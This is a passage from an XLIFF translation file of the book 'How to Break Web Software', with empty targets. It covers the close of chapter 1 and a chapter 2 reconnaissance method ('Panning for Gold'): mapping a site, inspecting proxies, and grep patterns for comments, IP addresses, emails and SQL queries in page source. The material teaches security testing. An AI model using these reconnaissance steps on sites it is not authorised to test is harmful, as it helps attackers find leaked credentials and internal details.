        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The lesson to learn in all this is simple: Trust no client, trust no network, and do all the important processing on the server. With this mantra in mind, let's look at some of the common attack methods against Web applications.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch01lev1sec5.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="ch01lev1sec7.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>Conclusion</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch01lev1sec6.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h3.text">
          <source>Conclusion</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The Web is different. There are specialized protocols and languages and software subsystems that drive them. These specialized systems require specialized testing techniques. In the following chapters, a set of such techniques is described in detail. Hopefully, these techniques will lead to more thoroughly tested Web sites and Web applications that are secured against tampering, sabotage, and attack.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Welcome to the world of Web testing.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch01lev1sec6.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="ch02.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>Chapter 2. Gathering Information on the Target</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch01lev1sec7.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h2.text">
          <source>Chapter 2. Gathering Information on the Target</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.a.text">
          <source>What's In This Chapter?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.a.text">
          <source>Introduction</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch01lev1sec7.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="ch02lev1sec1.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>What's In This Chapter?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch02.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h3.text">
          <source>What's In This Chapter?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>This chapter presents three separate attacks designed to gather information about your Web application. These attacks are generally the starting point for any security testing that you might want to perform on your Web application. The information that you gather will help you perform some of the attacks in later chapters.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch02.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="ch02lev1sec2.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>Introduction</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch02lev1sec1.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h3.text">
          <source>Introduction</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>War-time generals spend a great deal of time performing reconnaissance and gathering information on their adversary. They do this so they can decide how to use their offensive capability most effectively.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The same applies to software testing, where our goal is also &amp;quot;offensive&amp;quot; in nature. We aim to bring down the software by finding good bugs.&lt;sup class="docFootnote"&gt;&lt;a class="docLink" href="#ch02fn01"&gt;[1]&lt;/a&gt;&lt;/sup&gt; Thus, good intelligence about a target (in this case a Web application) can ensure that you apply the right attacks, use the right offensive machinery, and protect your own troops as much as possible.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.blockquote.p.text">
          <source>&lt;sup&gt;&lt;a name="ch02fn01"&gt;[1]&lt;/a&gt;&lt;/sup&gt; The purpose of software testing is to find defects and demonstrate the absence of defects. Thus, tests that find bugs are good tests because they allow us to reduce the number of latent bugs. Tests that do not find bugs are also good tests because they are evidence that the software performs as specified. But we must ensure that these latter types of tests are good ones. Testing the same thing over and over certainly verifies functionality but is largely unproductive. The attack methodology in this book is aimed at providing an arsenal of testing techniques that generate good test cases for either purpose.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Web testing is no different, except that our Web applications rarely fight back. We must gather as much information as possible on using a Web application and how it is implemented for the attacks that follow to be effective.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The attacks in this chapter are aimed at collecting the right set of information.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h4.text">
          <source>Attack 1 Panning for Gold</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Have you ever seen an old western movie where some old, toothless prospector pans for gold in a stream? This is a good mental image for this attack. The prospector picks up a gob of sand and rocks and sifts through it with his sieve, hoping to be the first to come across the elusive gold nugget.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>We scoff. What a waste of time!</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>But panning is only a waste of time if we choose the wrong stream and spend a lot of time looking for nuggets where there are only rocks and sand. Finding the golden bug in a Web application also requires that we know where to look. When we look in the right place, the payoff can be enormous.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>For Web testing, the artifacts we put through our sieve are easy to identify. Sifting through them is the subject of this attack.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h5.text">
          <source>When to Apply This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>An important part of any testing strategy is gathering as much information as possible. That's why this attack is always the first attack that any Web tester should consider. Generally, it's best to work in phases as outlined next. Although ad-hoc testing can and does find problems, it's also easy to miss something important.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>This attack is applied in four main places:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>Comments embedded in HTML source code</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>Sensitive information in HTML source code</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>Server-side error messages and HTTP responses</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>Application error messages</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The first two places require reading an application's source code looking for any information that's useful to an attacker. The last two require that we submit erroneous input to the application and then carefully analyze ensuing error messages for useful information.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Source code and error messages are valuable to an attacker. They will help him determine which Web sites contain gold and which have only sand and rocks.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The techniques are described next.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h5.text">
          <source>How to Conduct This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Reading source code is not what most people consider to be pleasant. Fortunately for us Web testers, we aren't doing it to find just any arbitrary bug, so our investigation is much more focused. In general, we want to identify HTML comments and look for sensitive information like passwords, usernames, and database names that might give an advantage to an attacker. Because much of the source code for a Web application is broadcast to the client machine, we have to remember that the attacker has access to it.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Details of how algorithms or business processes work inside the application may lead to insights into attack methods. Sometimes, panning for gold works well enough to uncover comments that developers have made to remind themselves or other developers of potential holes in the application.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Comments in production HTML code are not a good idea. Because HTML is not compiled, there is no mechanism for removing or hiding the comments from casual viewers. And one can easily view the source with Web applications via View, Source or File, Save As on the browser's menu bar.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Developers are taught to use comments to document design and communicate with other developers who may have to modify their code. But users are not meant to see these comments, particularly if they contain information that's useful to an attacker.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The information we are looking for in source code includes secrets that shouldn't be divulged, like database names, user logins, and passwords. To find this information, we must have a process for mapping out a Web application's architecture and analyzing its source.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The first thing to do is to map out the pages of the application so that you can understand how they are connected. Web crawlers (like wget or BlackWidow, which are discussed in &lt;a class="docLink" href="app03.html#app03"&gt;Appendix C&lt;/a&gt;, &amp;quot;Tools&amp;quot;) can help you achieve this, but unless the application is built of thousands of unique pages (not just pages that display differently when called with different parameters), it's usually better to perform this task by hand and obtain a more firsthand knowledge of the Web site's architecture. Using tools often produces so many duplicate pages that it's difficult to get the Web application inside your head. Manually mapping out a site may seem daunting, but you'll rarely regret doing it, and it will certainly make you a more efficient Web tester.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The process is straightforward. Begin at the application's start page and click every link to subsequent pages, documenting which pages you can reach. Continue in this fashion until you've visited all the pages. The result will be a diagram like &lt;a class="docLink" href="#ch02fig01"&gt;Figure 2-1&lt;/a&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure 2-1. A sample page map of the Web application.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The page map is better when annotated with data and parameters that are passed from page to page. The source code is of limited value in obtaining this information. It's easiest to look in the URL for the name=value pairs after the question mark that are separated by ampersands. (You can find a more detailed example in &lt;a class="docLink" href="ch04.html#ch04"&gt;Chapter 4&lt;/a&gt;, &amp;quot;State-Based Attacks.&amp;quot;) However, this only works for &lt;tt&gt;GET&lt;/tt&gt; parameters. Values passed via forms are usually transmitted differently.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Web proxy programs can help. Tools like IEHttpHeaders&lt;sup class="docFootnote"&gt;&lt;a class="docLink" href="#ch02fn02"&gt;[2]&lt;/a&gt;&lt;/sup&gt; and Paros&lt;sup class="docFootnote"&gt;&lt;a class="docLink" href="#ch02fn03"&gt;[3]&lt;/a&gt;&lt;/sup&gt; help uncover what is being sent between pages (see &lt;a class="docLink" href="#ch02fig02"&gt;Figure 2-2&lt;/a&gt;).</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.blockquote.p.text">
          <source>&lt;sup&gt;&lt;a name="ch02fn02"&gt;[2]&lt;/a&gt;&lt;/sup&gt; See &lt;a class="docLink" target="_blank" href="http://www.blunck.info/iehttpheaders.html"&gt;http://www.blunck.info/iehttpheaders.html&lt;/a&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.blockquote.p.text">
          <source>&lt;sup&gt;&lt;a name="ch02fn03"&gt;[3]&lt;/a&gt;&lt;/sup&gt; See &lt;a class="docLink" target="_blank" href="http://www.parosproxy.org/225235.html"&gt;http://www.parosproxy.org/225235.html&lt;/a&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure 2-2. Viewing form parameters using a Web proxy tool.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>If the application implements role-based access (different access privileges depending on the user's role, such as an administrator versus a normal user) or permissions for its users, it's much better to start off panning for gold as the lowest-level user (a user with no permissions) and then progress onto other roles with increasing privilege levels until you get to the most privileged user role.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Annotating this on the page map shows the boundaries of trust, as shown in &lt;a class="docLink" href="#ch02fig01"&gt;Figure 2-1&lt;/a&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>After the application has been mapped, return to each page and view the source. Search the HTML for comments (they appear inside of double dashes, like so: &amp;lt;!-- ... --&amp;gt;) to see what they contain. Most Web designers use comments to call out navigation sections in the page. Sometimes they can contain interesting clues that help with other attacks.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Application programming languages (PHP, ASP, Perl, and so on) use their own commenting style (// or /* ... */). These comments shouldn't be echoed to the client, but sometimes they can slip through via misplaced tags or HTML commenting. The ColdFusion application programming language is most susceptible to this because its comments are defined by &amp;lt;!-- ... --&amp;gt;. Notice the three dashes instead of the usual two in HTML comments. These are so similar to normal HTML comments that it is easy for a programmer to forget the extra dash.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The majority of the time, comments are uninteresting &amp;quot;markers&amp;quot; in the code added to help people understand the code's flow. Sometimes, however, you hit gold. Old code fragments that are no longer needed are often</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>just commented out instead of being removed altogether as they should be. These fragments can give hints about the inner workings of the application to attackers, besides other &amp;quot;configuration&amp;quot; information like machine or database names that may be contained in descriptive comments.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>In addition to manually looking for the flecks of gold in each source file (especially if you've used a Web crawler instead of visiting each page), you might consider searching for string patterns automatically. Grep is the ideal tool for this activity. Although it's commonly part of *NIX distributions, you'll have to install it on Windows. Cygwin&lt;sup class="docFootnote"&gt;&lt;a class="docLink" href="#ch02fn04"&gt;[4]&lt;/a&gt;&lt;/sup&gt; is a free Linux-type environment for Windows that comes packaged with most tools you'd expect on a *NIX platform, including grep. Some of the things to search for in the HTML source code are described next, with the regular-expression patterns to use in grep searches. A great free tool for helping you create your own search expressions is The Regulator, found at &lt;a class="docLink" target="_blank" href="http://regex.osherove.com/"&gt;http://regex.osherove.com/&lt;/a&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.blockquote.p.text">
          <source>&lt;sup&gt;&lt;a name="ch02fn04"&gt;[4]&lt;/a&gt;&lt;/sup&gt; See &lt;a class="docLink" target="_blank" href="http://www.cygwin.com/"&gt;http://www.cygwin.com/&lt;/a&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.thead.tr.th.p.text">
          <source>Item</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.thead.tr.th.p.text">
          <source>Description</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.thead.tr.th.p.text">
          <source>Grep Pattern</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>HTML comments</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Most HTML comments are uninteresting navigation or page section markers, but occasionally something useful pops up.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>&amp;lt;!--[^-][\w\W]*?[^-]--&amp;gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Application comments</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>All application comments should be stripped out on the Web server as the code is executed. Anything left is of interest to an attacker.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>&amp;lt;!---[\w\W]*?---&amp;gt; ColdFusion</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>//.* Single-line comments</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>/\*[\w\W]*?\*/ C-style block comments</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>^'.*</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>rem\s.* VB comments</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>IP addresses</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Any IP addresses in source code are worth looking at because they may reference servers other than the primary server for the application (for example, database servers, or the IP addresses of individual servers in a cluster).</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>E-mail address</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>May be private e-mail addresses of the developers.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>[\w]*(\.[\w]*)*@[\w]*(\.[\w]*)</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>SQL queries</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Finding these in the source of any page is like finding a huge nugget of gold. Not only does it show the database structure, but it also shows how queries are constructed.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>SELECT\s[\w\*\)\(\,\s]+\sFROM\s[\w]+</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>UPDATE\s[\w]+\sSET\s[\w\,\'\=]+</source>
